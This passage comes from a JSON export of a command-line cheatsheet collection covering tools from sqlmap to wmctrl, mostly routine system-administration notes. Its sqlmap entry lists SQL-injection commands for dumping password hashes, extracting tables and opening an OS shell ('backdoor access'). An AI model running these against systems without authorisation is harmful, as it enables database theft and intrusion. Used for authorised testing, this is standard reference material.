          "content": "---\ntags: [ database ]\n---\n# Test URL and POST data and return database banner (if possible)\n./sqlmap.py --url=\"<url>\" --data=\"<post-data>\" --banner\n\n# Parse request data and test | request data can be obtained with burp\n./sqlmap.py -r <request-file> <options>\n\n# Fingerprint | much more information than banner\n./sqlmap.py -r <request-file> --fingerprint\n\n# Get database username, name, and hostname\n./sqlmap.py -r <request-file> --current-user --current-db --hostname\n\n# Check if user is a database admin\n./sqlmap.py -r <request-file> --is-dba\n\n# Get database users and password hashes\n./sqlmap.py -r <request-file> --users --passwords\n\n# Enumerate databases\n./sqlmap.py -r <request-file> --dbs\n\n# List tables for one database\n./sqlmap.py -r <request-file> -D <db-name> --tables\n\n# Other database commands\n./sqlmap.py -r <request-file> -D <db-name> --columns\n                                           --schema\n                                           --count\n# Enumeration flags\n./sqlmap.py -r <request-file> -D <db-name>\n                              -T <tbl-name>\n                              -C <col-name>\n                              -U <user-name>\n\n# Extract data\n./sqlmap.py -r <request-file> -D <db-name> -T <tbl-name> -C <col-name> --dump\n\n# Execute SQL Query\n./sqlmap.py -r <request-file> --sql-query=\"<sql-query>\"\n\n# Append/Prepend SQL Queries\n./sqlmap.py -r <request-file> --prefix=\"<sql-query>\" --suffix=\"<sql-query>\"\n\n# Get backdoor access to sql server | can give shell access\n./sqlmap.py -r <request-file> --os-shell\n"
        },
        {
          "name": "ss",
          "type": "blob",
          "size": 0.4453125,
          "content": "---\ntags: [ networking ]\n---\nArgs\n-4/-6 list ipv4/ipv6 sockets\n-n numeric addresses instead of hostnames\n-l list listing sockets\n-u/-t/-x list udp/tcp/unix sockets\n-p Show process(es) that using socket\n\n# show all listening tcp sockets including the corresponding process\nss -tlp\n\n# show all sockets connecting to 192.168.2.1 on port 80\nss -t dst 192.168.2.1:80\n\n# show all ssh related connection\nss -t state established '( dport = :ssh or sport = :ssh )'\n"
        },
        {
          "name": "ssh",
          "type": "blob",
          "size": 1.845703125,
          "content": "---\ntags: [ ssh ]\n---\n# To ssh via pem file (which normally needs 0600 permissions):\nssh -i <pemfile> <user>@<host>\n\n# To connect on a non-standard port:\nssh -p <port> <user>@<host>\n\n# To connect and forward the authentication agent:\nssh -A <user>@<host>\n\n# To execute a command on a remote server:\nssh -t <user>@<host> 'the-remote-command'\n\n# To connect to a host with a specific key exchange algorithm:\n# Full list of available algorithms : man ssh_config\nssh -oKeXAlgorithms=+diffie-hellman-group-exchange-sha1 <user>@<server>\n\n# To tunnel an x session over SSH:\nssh -X <user>@<host>\n\n# Redirect traffic with a tunnel between local host (port 8080) and a remote\n# host (remote.example.com:5000) through a proxy (personal.server.com):\nssh -f -L 8080:remote.example.com:5000 user@personal.server.com -N\n\n# To launch a specific x application over SSH:\nssh -X -t <user>@<host> 'chromium-browser'\n\n# To create a SOCKS proxy on localhost and <port>:\nssh -qND <port> <user>@<host>\n\n# To tunnel an ssh session over the SOCKS proxy on localhost and port 9999:\nssh -o \"ProxyCommand nc -x 127.0.0.1:9999 -X 4 %h %p\" <user>@<host>\n\n# -X use an xsession, -C compress data, \"-c blowfish\" use the encryption blowfish:\nssh <user>@<host> -C -c blowfish -X\n\n# For more information, see:\n# http://unix.stackexchange.com/q/12755/44856\n\n# To copy files and folders through ssh from remote host to pwd with tar.gz\n# compression when there is no rsync command available:\nssh <user>@<host> \"cd /var/www/Shared/; tar zcf - asset1 asset2\" | tar zxf -\n\n# To mount folder/filesystem through SSH\n# Install SSHFS from https://github.com/libfuse/sshfs\n# Will allow you to mount a folder securely over a network.\nsshfs <user>@<host>:/path/to/folder /path/to/mount/point\n\n# Emacs can read file through SSH\n# Doc: http://www.gnu.org/software/emacs/manual/html_node/emacs/Remote-Files.html\nemacs /ssh:<user>@<host>:<file>\n"
        },
        {
          "name": "ssh-add",
          "type": "blob",
          "size": 0.3583984375,
          "content": "---\ntags: [ ssh ]\n---\n# To add private key:\nssh-add <keyfile>\n\n# To load resident keys from FIDO2 authenticator:\nssh-add -K\n\n# To store a GitHub SSH passphrase in your keychain:\nssh-add -K ~/.ssh/github_rsa\n\n# To list all public keys:\nssh-add -L\n\n# To list fingerprints of all keys:\nssh-add -l\n\n# To delete key:\nssh-add -d <keyfile>\n\n# To delete all keys:\nssh-add -D\n"
        },
        {
          "name": "ssh-copy-id",
          "type": "blob",
          "size": 0.3330078125,
          "content": "---\ntags: [ ssh ]\n---\n# To copy your keys listed in `ssh-add -L` to a remote host:\nssh-copy-id <user>@<host>\n\n# To copy the keys to a remote host on a non-standard port:\nssh-copy-id <user>@<host> -p 2222\n\n# To copy one single public key to a remote host on a non-standard port:\nssh-copy-id -i ~/.ssh/a_public_key.pub \"username@host -p 2222\"\n"
        },
        {
          "name": "ssh-keygen",
          "type": "blob",
          "size": 1.0322265625,
          "content": "---\ntags: [ ssh ]\n---\n# To generate an SSH key:\nssh-keygen -t rsa\n\n# To generate a 4096-bit SSH key:\nssh-keygen -t rsa -b 4096\n\n# To generate a FIDO/U2F token-backed key:\nssh-keygen -t ed25519-sk\n\n# To generate a FIDO2 resident key:\nssh-keygen -t ed25519-sk -O resident\n\n# To update a passphrase on a key:\nssh-keygen -p -P <old-passphrase> -N <new-passphrase> -f <keyfile>\n\n# To remove a passphrase on a key:\nssh-keygen -p -P <old-passphrase> -N '' -f <keyfile>\n\n# To generate a 4096 bit RSA key with a passphase and comment containing the user and hostname:\nssh-keygen -t rsa -b 4096 -C \"$USER@$HOSTNAME\" -P <passphrase>\n\n# To print the fingerprint of a public key:\nssh-keygen -lf <keyfile>\n\n# To print the Github-style (MD5) fingerprint of a public key:\nssh-keygen -E md5 -lf <keyfile>\n\n# To download resident keys from a FIDO2 authenticator to the current directory:\nssh-keygen -K\n\n# To view the public key associated with a private key:\nssh-keygen -y -f <private-key-file> > <public-key-file>\nssh-keygen -y -f ~/.ssh/private-key > ~/.ssh/public-key.pub\n"
        },
        {
          "name": "stdout",
          "type": "blob",
          "size": 0.2890625,
          "content": "# To redirect stderr to stdout:\nsome-command 2>&1\n\n# To redirect stdout to <file>:\nsome-command > <file>\n\n# To redirect stderr to <file>:\nsome-command 2> <file>\n\n# To redirect all output (stderr and stdout) to file:\nsome-command > <file> 2>&1\n\n# Replace <file> with `/dev/null` to silence output\n"
        },
        {
          "name": "strace",
          "type": "blob",
          "size": 0.576171875,
          "content": "# To strace a command:\nstrace <command>\n\n# To save the trace to a file:\nstrace -o <outfile> <command>\n\n# To follow only the open() system call:\nstrace -e trace=open <command>\n\n# To follow all the system calls which open a file:\nstrace -e trace=file <command>\n\n# To follow all the system calls associated with process management:\nstrace -e trace=process <command>\n\n# To follow child processes as they are created:\nstrace -f <command>\n\n# To count time, calls and errors for each system call:\nstrace -c <command>\n\n# To trace a running process (multiple PIDs can be specified):\nstrace -p <pid>\n"
        },
        {
          "name": "su",
          "type": "blob",
          "size": 0.0458984375,
          "content": "# To switch to another user account:\nsu <user>\n"
        },
        {
          "name": "sudo",
          "type": "blob",
          "size": 0.0615234375,
          "content": "# Preserve user environment when running command\nsudo -E <cmd>\n"
        },
        {
          "name": "svn",
          "type": "blob",
          "size": 0.41015625,
          "content": "---\ntags: [ vcs ]\n---\n# To Update working copy from repository:\nsvn update \"/path\"\n\n# To Show changed files in working copy:\nsvn status\n\n# To Show what changed in local file:\nsvn diff \"/path/filename\"\n\n# To Add files or folders:\nsvn add \"path/item\"\n\n# To Revert local uncommited changes:\nsvn revert \"/path/file\"\n\n# To Commit changes to repo:\nsvn commit -m \"message\" \"/path\"\n\n# To Show help for 'svn diff':\nsvn help diff\n"
        },
        {
          "name": "systemctl",
          "type": "blob",
          "size": 1.8271484375,
          "content": "# To see running processes:\nsystemctl\n\n# To check the status of a service:\nsystemctl status foo.service\n\n# To start/restart/stop a service:\nsystemctl start/restart/stop foo.service\n\n# To reload a service's configuration:\nsystemctl reload foo.service\n\n# To edit a service's configuration:\nsystemctl edit foo.service\n\n# To reload systemd manager configuration:\nsystemctl daemon-reload\n\n# To enable a service to startup on boot:\nsystemctl enable foo.service\n\n# To disable a service to startup on boot:\nsystemctl disable foo.service\n\n# To start/restart/stop per-user service:\nsystemctl --user start/restart/stop emacs.service\n\n# To see all active units, add --all for everything:\nsystemctl list-units\n\n# To see all service units:\nsystemctl list-units -at service\n\n# To see filtered units (all running service):\nsystemctl list-units -t service --state running\n\n# To see all service files, see which are enabled or disabled:\nsystemctl list-unit-files -at service\n\n# To list all units with specific status, inactive, active, enabled, running, exited:\nsystemctl list-units --all --state=inactive\n\n# To use systemctl to list all unit files:\nsystemctl list-unit-files\n\n# To see log items from the most recent boot:\njournalctl -b\n\n# To to see only kernal messages, add -b for at the most recent boot:\njournalctl -k\n\n# To get the log entries for a service since boot:\njournalctl -b -u foo.service\n\n# To list the dependencies of a service:\n# when no service name is specified, lists the dependencies of default.target\n# add -all to expand dependencies recursively\nsystemctl list-dependencies foo.service \n\n# To see low level details of a service settings on the system:\nsystemctl show foo.service\n\n# To list currently loaded targets:\nsystemctl list-units --type=target\n\n# To change current target:\nsystemctl isolate foo.target\n\n# To change default target:\nsystemctl enable foo.target\n"
        },
        {
          "name": "systemd",
          "type": "blob",
          "size": 0.359375,
          "content": "# To display process startup time:\nsystemd-analyze\n\n# To display process startup time at service level:\nsystemd-analyze blame\n\n# To list running units:\nsystemctl list-units\n\n# To load a unit at startup:\nsystemctl enable foo.service\n\n# To start or Stop a unit:\nsystemctl <start | stop> foo.service\n\n# To unit file locations:\n/etc/systemd/system\n/usr/lib/systemd/system\n"
        },
        {
          "name": "tail",
          "type": "blob",
          "size": 0.353515625,
          "content": "# To show the last 10 lines of <file>:\ntail <file>\n\n# To show the last <number> lines of <file>:\ntail -n <number> <file>\n\n# To show the last lines of <file> starting with <number>:\ntail -n +<number> <file>\n\n# To show the last <number> bytes of <file>:\ntail -c <number> <file>\n\n# To show the last 10 lines of <file> and to wait for <file> to grow:\ntail -f <file>\n"
        },
        {
          "name": "tar",
          "type": "blob",
          "size": 1.2080078125,
          "content": "---\ntags: [ compression ]\n---\n# To extract an uncompressed archive:\ntar -xvf /path/to/foo.tar\n\n# To extract a .tar in specified directory:\ntar -xvf /path/to/foo.tar -C /path/to/destination/\n\n# To create an uncompressed archive:\ntar -cvf /path/to/foo.tar /path/to/foo/\n\n# To extract a .tgz or .tar.gz archive:\ntar -xzvf /path/to/foo.tgz\ntar -xzvf /path/to/foo.tar.gz\n\n# To create a .tgz or .tar.gz archive:\ntar -czvf /path/to/foo.tgz /path/to/foo/\ntar -czvf /path/to/foo.tar.gz /path/to/foo/\n\n# To list the content of an .tgz or .tar.gz archive:\ntar -tzvf /path/to/foo.tgz\ntar -tzvf /path/to/foo.tar.gz\n\n# To extract a .tar.bz2 archive:\ntar -xjvf /path/to/foo.tar.bz2\n\n# To create a .tar.bz2 archive:\ntar -cjvf /path/to/foo.tar.bz2 /path/to/foo/\n\n# To list the content of an .tar.bz2 archive:\ntar -tjvf /path/to/foo.tar.bz2\n\n# To create a .tgz archive and exclude all jpg,gif,... from the tgz:\ntar -czvf /path/to/foo.tgz --exclude=\\*.{jpg,gif,png,wmv,flv,tar.gz,zip} /path/to/foo/\n\n# To use parallel (multi-threaded) implementation of compression algorithms:\ntar -z ... -> tar -Ipigz ...\ntar -j ... -> tar -Ipbzip2 ...\ntar -J ... -> tar -Ipixz ...\n\n# To append a new file to an old tar archive:\ntar -rf <archive.tar> <new-file-to-append>\n"
        },
        {
          "name": "tarsnap",
          "type": "blob",
          "size": 0.619140625,
          "content": "---\ntags: [ compression ]\n---\n# Perform a backup of two directories\ntarsnap -c -f <archive-name> /usr/home /other/stuff/to/backup\n\n# Print how much data would be uploaded\ntarsnap -c -f <archive-name> --dry-run --print-stats <directories...>\n\n# Copy an archive (only accesses metadata)\ntarsnap -c -f <target-archive-name> @@<source-archive>\n\n# List the archives\ntarsnap --list-archives\n\n# Delete an archive\ntarsnap -d -f <archive-name>\n\n# List the files in an archive\ntarsnap -tv -f <archive-name>\n\n# Restore two users' home directories from an archive (use no leading slashes)\ntarsnap -x -f <archive-name> usr/home/alice usr/home/bob\n"
        },
        {
          "name": "tcpdump",
          "type": "blob",
          "size": 2.2490234375,
          "content": "# TCPDump is a packet analyzer. It allows the user to intercept and display TCP/IP\n# and other packets being transmitted or received over a network. (cf Wikipedia).\n# Note: 173.194.40.120 => google.com\n\n# Intercepts all packets on eth0\ntcpdump -i eth0\n\n# Intercepts all packets from/to 173.194.40.120\ntcpdump host 173.194.40.120\n\n# Intercepts all packets on all interfaces from / to 173.194.40.120 port 80\n# -nn => Disables name resolution for IP addresses and port numbers.\ntcpdump -nn -i any host 173.194.40.120 and port 80\n\n# Make a grep on tcpdump (ASCII)\n# -A  => Show only ASCII in packets.\n# -s snaplen => Capture only snaplen bytes of data from each packet.\n#    By default, tcpdump captures 262144 bytes.\n#    Packets truncated because of a limited snapshot are indicated in the\n#    output with '[|protocol]'.\ntcpdump -i any -A host 173.194.40.120 and port 80 | grep 'User-Agent'\n\n# With ngrep\n# -d eth0 => To force eth0 (else ngrep work on all interfaces)\n# -s0 => force ngrep to look at the entire packet. (Default snaplen: 65536 bytes)\nngrep 'User-Agent' host 173.194.40.120 and port 80\n\n# Intercepts all packets on all interfaces from / to 8.8.8.8 or 173.194.40.127 on port 80\ntcpdump 'host ( 8.8.8.8 or 173.194.40.127 ) and port 80' -i any\n\n# Intercepts all packets SYN and FIN of each TCP session.\ntcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0'\n\n# To display SYN and FIN packets of each TCP session to a host that is not on our network\ntcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net local_addr'\n\n# To display all IPv4 HTTP packets that come or arrive on port 80 and that contain only data (no SYN, FIN no, no packet containing an ACK)\ntcpdump 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'\n\n# Saving captured data\ntcpdump -w file.cap\n\n# Reading from capture file\ntcpdump -r file.cap\n\n# Show content in hexa\n# Change -x to -xx => show extra header (ethernet).\ntcpdump -x\n\n# Show content in hexa and ASCII\n# Change -X to -XX => show extra header (ethernet).\ntcpdump -X\n\n# Note on packet maching:\n# Port matching:\n# - portrange 22-23\n# - not port 22\n# - port ssh\n# - dst port 22\n# - src port 22\n#\n# Host matching:\n# - dst host 8.8.8.8\n# - not dst host 8.8.8.8\n# - src net 67.207.148.0 mask 255.255.255.0\n# - src net 67.207.148.0/24\n"
        },
        {
          "name": "tee",
          "type": "blob",
          "size": 0.2587890625,
          "content": "# To tee stdout to <outfile>:\nls | tee <outfile>\n\n# To tee stdout and append to <outfile>:\nls | tee -a <outfile>\n\n# To tee stdout to the terminal, and also pipe it into another program for further processing:\nls | tee /dev/tty | xargs printf \"\\033[1;34m%s\\033[m\\n\"\n"
        },
        {
          "name": "terraform",
          "type": "blob",
          "size": 0.662109375,
          "content": "---\ntags: [ orchestration, iac ]\n---\n# Initialize this configuration.\n\nterraform init\n\n# Reformat configuration in the standard style\n\nterraform fmt\n\n# Check whether the configuration is valid\n\nterraform validate\n\n# Apply terraform configuration\n\nterraform apply\n\n# Delete applied terraform configuration\n\nterraform destroy\n\n# To upgrade your [Terraform providers](https://www.terraform.io/docs/providers/index.html), which are distributed separately from the Terraform binary. \n\nterraform init -upgrade\n\n# To upgrade your [Terraform modules](https://www.terraform.io/docs/modules/index.html), which are distributed separately from the Terraform binary. \n\nterraform get -update\n"
        },
        {
          "name": "tidy",
          "type": "blob",
          "size": 0.109375,
          "content": "# Enable indentation, wrap lines at column 160, messages to stdout:\ntidy -i -wrap 160 -o output.html input.html\n"
        },
        {
          "name": "timedatectl",
          "type": "blob",
          "size": 0.0517578125,
          "content": "# Set timezone\ntimedatectl set-timezone Europe/Paris\n"
        },
        {
          "name": "tmux",
          "type": "blob",
          "size": 0.8408203125,
          "content": "# To start tmux:\ntmux\n\n# To detach from tmux:\nCtrl-b d\n\n# To restore tmux session:\ntmux attach\n\n# To detach an already attached session (great if you are moving devices with different screen resolutions):\ntmux attach -d \n\n# To display session:\ntmux ls\n\n# To rename session:\nCtrl-b $\n\n# To switch session:\nCtrl-b s\n\n# To start a shared session:\ntmux -S /tmp/your_shared_session\nchmod 777 /tmp/your_shared_session\n\n# To help screen (Q to quit):\nCtrl-b ?\n\n# To scroll in window:\nCtrl-b PageUp/PageDown\n\n# To reload configuration file\nCtrl-b : source-file /path/to/file\n\n# To create a window:\nCtrl-b c\n\n# To go next window:\nCtrl-b n\n\n# To destroy a window:\nCtrl-b x\n\n# To switch between windows:\nCtrl-b [0-9]\nCtrl-b Arrows\n\n# To split windows horizontally:\nCtrl-b %\n\n# To split windows vertically:\nCtrl-b \"\n\n# To swap windows:\nCtrl-b :swap-window -s [0-9] -t [0-9]\n"
        },
        {
          "name": "top",
          "type": "blob",
          "size": 0.578125,
          "content": "# To update every <interval> samples:\ntop -i <interval>\n\n# To set the delay between updates to <delay> seconds:\ntop -s <delay>\n\n# To set event counting to accumulative mode:\ntop -a\n\n# To set event counting to delta mode:\ntop -d\n\n# To set event counting to absolute mode:\ntop -e\n\n# To not calculate statistics on shared libraries, also known as frameworks:\ntop -F\n\n# To calculate statistics on shared libraries, also known as frameworks (default):\ntop -f\n\n# To print command line usage information and exit:\ntop -h\n\n# To order the display by sorting on <key> in descending order:\ntop -o <key>\n"
        },
        {
          "name": "touch",
          "type": "blob",
          "size": 0.2626953125,
          "content": "# To change a file's modification time:\ntouch -d <time> <file>\ntouch -d 12am <file>\ntouch -d \"yesterday 6am\" <file>\ntouch -d \"2 days ago 10:00\" <file>\ntouch -d \"tomorrow 04:00\" <file>\n\n# To put the timestamp of a file on another:\ntouch -r <refrence-file> <target-file>\n"
        },
        {
          "name": "tr",
          "type": "blob",
          "size": 0.708984375,
          "content": "# To replace : with a new line:\necho $PATH | tr \":\" \"\\n\"\necho $PATH | tr -t \":\" \\n \n\n# To remove all occurance of \"ab\":\necho aabbcc | tr -d \"ab\"         # ouput: cc\n\n# To complement \"aa\":\n# (\"Complement\" means to keep \"aa\", and replace all others with \"x\")\necho aabbccd | tr -c \"aa\" x       # output: aaxxxxx (no newline)\n\n# To complement \"ab\\n\":\necho aabbccd | tr -c \"ab\\n\" x    #output: aabbxxx (with newline)\n\n# To preserve all alpha(-c). \":-[:digit:] etc\" will be translated to \"\\n\". sequeeze mode:\necho $PATH | tr -cs \"[:alpha:]\" \"\\n\" \n\n# To convert an ordered list to an unordered list:\necho \"1. /usr/bin\\n2. /bin\" | tr -cs \" /[:alpha:]\\n\" \"+\"\n\n# To remove all NULLs:\ntr < file-with-nulls -d '\\000' > file-without-nulls\n"
        },
        {
          "name": "trashy",
          "type": "blob",
          "size": 0.197265625,
          "content": "# To trash foo and bar:\ntrash foo bar\n\n# To trash \"foo bar\":\ntrash foo\\ bar\n\n# To list files in trash:\ntrash -v --list\n\n# To restore foo from trash:\ntrash --restore foo\n\n# To empty trash:\ntrash --empty\n"
        },
        {
          "name": "tree",
          "type": "blob",
          "size": 0.33203125,
          "content": "# To display a recursive directory tree:\ntree\n\n# To make tree output contents from <dir>:\ntree <dir>\n\n# To make tree omit any empty directories from the output:\ntree --prune\n\n# To make tree list *all* files and directories, even hidden ones:\ntree -a\n\n# To list directories only (`-d`), and at a max depth of two levels (`-L`):\ntree -d -L 2\n"
        },
        {
          "name": "truncate",
          "type": "blob",
          "size": 0.23828125,
          "content": "# To clear the contents from <file>:\ntruncate -s 0 <file>\n\n# To truncate <file> to 100 bytes:\ntruncate -s 100 <file>\n\n# To truncate <file> to 100 KB:\ntruncate -s 100K <file>\n\n# (M, G, T, P, E, Z, and Y may be used in place of \"K\" as required.)\n"
        },
        {
          "name": "udisksctl",
          "type": "blob",
          "size": 0.2119140625,
          "content": "# To get info about a device:\nudisksctl info -b <device>\n\n# To mount a device:\nudisksctl mount --block-device <device>\n\n# To unmount a device:\nudisksctl unmount --block-device <device>\n\n# To get help:\nudisksctl help \n"
        },
        {
          "name": "ulimit",
          "type": "blob",
          "size": 0.0859375,
          "content": "# Report all current limits\nulimit -a\n\n# Unlimited file descriptors\nulimit -n unlimited\n"
        },
        {
          "name": "uname",
          "type": "blob",
          "size": 0.4794921875,
          "content": "# To print all system information:\nuname -a\n# Linux system-hostname 3.2.0-4-amd64 #1 SMP Debian 3.2.32-1 x86_64 GNU/Linux\n\n# To print the hostname:\nuname -n\n# system-hostname\n\n# To print the kernel release:\nuname -r\n# 3.2.0-4-amd64\n\n# To print the kernel version, with more specific information:\nuname -v\n# #1 SMP Debian 3.2.32-1\n\n# To print the hardware instruction set:\nuname -m\n# x86_64\n\n# To print the kernel name:\nuname -s\n# Linux\n\n# To print the operating system:\nuname -o\n# GNU/Linux\n"
        },
        {
          "name": "uniq",
          "type": "blob",
          "size": 0.369140625,
          "content": "# To show all lines without duplication:\n# (`sort -u` and `uniq` have the same effect.)\nsort <file> | uniq\n\n# To show not duplicated lines:\nsort <file> | uniq -u\n\n# To show duplicated lines only:\nsort <file> | uniq -d\n\n# To count all lines:\nsort <file> | uniq -c\n\n# To count not duplicated lines:\nsort <file> | uniq -uc\n\n# To count only duplicated lines:\nsort <file> | uniq -dc\n"
        },
        {
          "name": "unzip",
          "type": "blob",
          "size": 0.2626953125,
          "content": "---\ntags: [ compression ]\n---\n# To extract an archive:\nunzip <archive>\n\n# To extract an archive to a specific directory:\nunzip <archive> -d <directory>\n\n# To test integrity of archive:\nunzip -tq <archive>\n\n# To list files and directories an archive:\nunzip -l <archive>\n"
        },
        {
          "name": "uptime",
          "type": "blob",
          "size": 0.556640625,
          "content": "---\ntags: [ system reporting ]\n---\n\n# syntax of the command\nuptime [option]\n\n# single use, with output example\nuptime\n\n<current time>, <system state>, <running time>, <number of current logged in users>, <system load averages>\n\n14:05:11        up              6:05,           1 user,                              load average: 0.46, 0.54, 0.55\n\n# Filter the result to only show running time\nuptime -p\n\n# Filter the result to only show the date/time from when the system has been running\nuptime -s\n\n# Show the version of uptime\nuptime -V\n\n# Show the help page\nuptime -h\n\n"
        },
        {
          "name": "urpm",
          "type": "blob",
          "size": 0.2880859375,
          "content": "---\ntags: [ packaging ]\n---\n# To search (fuzzy) <package>:\nurpmq -Y <package>\n\n# To check if <package> is installed:\nrpm -q <package>\n\n# To install <package>:\nurpmi <package>\n\n# To download <package> without installing it:\nurpmi --no-install <package>\n\n# To uninstall <package>:\nurpme <package>\n"
        },
        {
          "name": "usermod",
          "type": "blob",
          "size": 0.056640625,
          "content": "# Add user to sudo group\nsudo usermod -aG sudo <username>\n"
        },
        {
          "name": "vagrant",
          "type": "blob",
          "size": 0.396484375,
          "content": "# To initate Vagrant:\nvagrant init\n\n# To add a box to a vagrant repo:\nvagrant box add hashicorp/precise32\n\n# To start a vm:\nvagrant up\n\n# To connect to a running instance:\nvagrant ssh\n\n# To shut down a vm:\nvagrant halt\n\n# To hibernate a vm:\nvagrant suspend\n\n# To set a vm to its initial state by cleaning all data:\nvagrant destroy\n\n# To restart a vm with a new provision script:\nvagrant reload --provision\n"
        },
        {
          "name": "vim",
          "type": "blob",
          "size": 3.6953125,
          "content": "---\ntags: [ vim ]\n---\n\n# File management\n\n:e              reload file\n:q              quit\n:q!             quit without saving changes\n:w              write file\n:w {file}       write new file\n:x              write file and exit\n\n# Movement\n\n    k\n  h   l         basic motion\n    j\n\nw               next start of word\nW               next start of whitespace-delimited word\ne               next end of word\nE               next end of whitespace-delimited word\nb               previous start of word\nB               previous start of whitespace-delimited word\n0               start of line\n$               end of line\ngg              go to first line in file\nG               go to end of file\ngk\t\tmove down one displayed line\ngj\t\tmove up one displayed line\n\n# Insertion\n#   To exit from insert mode use Esc or Ctrl-C\n#   Enter insertion mode and:\n\na               append after the cursor\nA               append at the end of the line\ni               insert before the cursor\nI               insert at the beginning of the line\no               create a new line under the cursor\nO               create a new line above the cursor\nR               enter insert mode but replace instead of inserting chars\n:r {file}       insert from file\n\n# Editing\n\nu               undo\nyy              yank (copy) a line\ny{motion}       yank text that {motion} moves over\np               paste after cursor\nP               paste before cursor\n<Del> or x      delete a character\ndd              delete a line\nd{motion}       delete text that {motion} moves over\n\n# Search and replace with the `:substitute` (aka `:s`) command\n\n:s/foo/bar/\treplace the first match of 'foo' with 'bar' on the current line only\n:s/foo/bar/g\treplace all matches (`g` flag) of 'foo' with 'bar' on the current line only\n:%s/foo/bar/g\treplace all matches of 'foo' with 'bar' in the entire file (`:%s`)\n:%s/foo/bar/gc\task to manually confirm (`c` flag) each replacement\n\n# Preceding a motion or edition with a number repeats it 'n' times\n# Examples:\n50k         moves 50 lines up\n2dw         deletes 2 words\n5yy         copies 5 lines\n42G         go to line 42\n\n# Multiple windows\n:e filename      - edit another file\n:split filename  - split window and load another file\nctrl-w up arrow  - move cursor up a window\nctrl-w ctrl-w    - move cursor to another window (cycle)\nctrl-w_          - maximize current window\nctrl-w=          - make all equal size\n10 ctrl-w+       - increase window size by 10 lines\n:vsplit file     - vertical split\n:sview file      - same as split, but readonly\n:hide            - close current window\n:only            - keep only this window open\n:ls              - show current buffers\n:.! <command>    - shell out\n\n# Buffers\n# move to N, next, previous, first last buffers\n:bn              - goes to next buffer\n:bp              - goes to prev buffer\n:bf              - goes to first buffer\n:bl              - goes to last buffer\n:b 2             - open buffer #2 in this window\n:new             - open a new buffer\n:vnew            - open a new vertical buffer\n:bd 2            - deletes buffer 2\n:wall            - writes all buffers\n:ball            - open a window for all buffers\n:bunload         - removes buffer from window\n:taball          - open a tab for all buffers\n\n# Pointers back\nctrl-o\n\n# Pointers forward\nctrl-o\n\n# Super search\nctrl-p\n\n# To sort  a visual range on column 1 as a number:\n:'<,'>!sort -gk 1 -t ,\n\n# Map (in normal mode) the F2 key to a bash call `uuidgen`, then trim the `\\n`\n# from the result, and put that in the expression register `\"=`, then put that\n# before the cursor:\nnmap <F2> \"= system(\"uuidgen\")[:-2]<C-M>P\n\n# Delete every line that has a FOO in it. See `:help global`.\n# The _ in the d _ command ensures registers and clipboards are not changed.\n:g/FOO/d _\n"
        },
        {
          "name": "vim-plugins",
          "type": "tree",
          "content": null
        },
        {
          "name": "virtualenv",
          "type": "blob",
          "size": 0.9931640625,
          "content": "# To create a new environment:\nvirtualenv /path/to/project/env_name\n\n# To create a new environment and inherit already installed Python libraries:\nvirtualenv --system-site-package /path/to/project/env_name\n\n# To create a new environment with a given Python interpreter:\nvirtualenv /path/to/project/env_name -p /usr/bin/python/3.4\n\n# To activate an environnment:\nsource /path/to/project/env_name/bin/activate\n\n# To quit an environment:\ndeactivate\n\n# To Virtualenvwrapper (wrapper for virtualenv) installation:\npip install --user virtualenvwrapper\n# configuration\n# add in ~/.bashrc or similar\nexport WORKON_HOME=~/.virtualenvs\nmkdir -p $WORKON_HOME\nsource ~/.local/bin/virtualenvwrapper.sh\n\n# To create a new environmment (with virtualenvwrapper)\nmkvirtualenv env_name\n# new environmment is stored in ~/.virtualenvs\n\n# To activate environmment (with virtualenvwrapper)\nworkon env_name\n\n# To quit environmment (with virtualenvwrapper)\ndeactivate\n\n# To delete environmment (with virtualenvwrapper)\nrmvirtualenv env_name\n"
        },
        {
          "name": "wc",
          "type": "blob",
          "size": 0.498046875,
          "content": "# To count the number of words (file or STDIN):\nwc -w <file>\ncat <file> | wc -w\n\n# To count the number of lines (file or STDIN):\nwc -l <file>\ncat <file> | wc -l\n\n# To count the number of bytes (file or STDIN):\nwc -c <file>\ncat <file> | wc -c\n\n# To count files and directories at a given location:\nls | wc -l\n\n# To if you ever use `wc` in a shell script and need to compare the output with an int you can\n# clean the output (wc returns extra characters around the integer) by using xargs:\nls -l | wc -l | xargs\n"
        },
        {
          "name": "weechat",
          "type": "blob",
          "size": 0.3017578125,
          "content": "# To set an unread marker on all windows:\nCtrl-s Ctrl-u\n\n# To switch to the left buffer:\nCtrl-p, Alt-left\n\n# To switch to the right buffer:\nCtrl-n, Alt-right\n\n# To switch to the next buffer with activity:\nAlt-a\n\n# To switch buffers:\nAlt-0...9\n\n# To scroll buffer title:\nF9/F10\n\n# To scroll nick list:\nF11/F12\n"
        },
        {
          "name": "wget",
          "type": "blob",
          "size": 0.955078125,
          "content": "# To download <url>:\nwget <url>\n#\n# To download multiples files with multiple URLs:\nwget <url>...\n\n# To download <url> and change its name:\nwget <url> -O <outfile>\n\n# To download <url> into <dir>:\nwget -P <dir> <url>\n\n# To continue an aborted downloaded:\nwget -c <url>\n\n# To parse a file that contains a list of URLs to fetch each one:\nwget -i url_list.txt\n\n# To mirror a whole page locally:\nwget -pk <url>\n\n# To mirror a whole site locally:\nwget -mk <url>\n\n# To download files according to a pattern:\nwget http://example.com/files-{1..15}.tar.bz2\n\n# To download all the files in a directory with a specific extension if directory indexing is enabled:\nwget -r -l1 -A.extension http://example.com/directory\n\n# To download only response headers (-S --spider) and display them on stdout (-O -).:\nwget -S --spider -O - <url>\n\n# To change the User-Agent to 'User-Agent: toto':\nwget -U 'toto' <url>\n\n# To download a file with specific speed EX:500kb/sec:\nwget --limit-rate=500k <url>\n"
        },
        {
          "name": "wmctrl",
          "type": "blob",
          "size": 0.529296875,
          "content": "# CLI for X Window Manager.\n# More information: https://manned.org/wmctrl.\n\n# List all windows, managed by the window manager:\nwmctrl -l\n\n# Switch to the first window whose (partial) title matches:\nwmctrl -a window_title\n\n# Move a window to the current workspace, raise it and give it focus:\nwmctrl -R window_title\n\n# Switch to a workspace:\nwmctrl -s workspace_number\n\n# Select a window and toggle fullscreen:\nwmctrl -r window_title -b toggle,fullscreen\n\n# Select a window a move it to a workspace:\nwmctrl -r window_title -t workspace_number\n"
        },
        {
          "name": "woeusb",
          "type": "blob",
          "size": 0.5498046875,
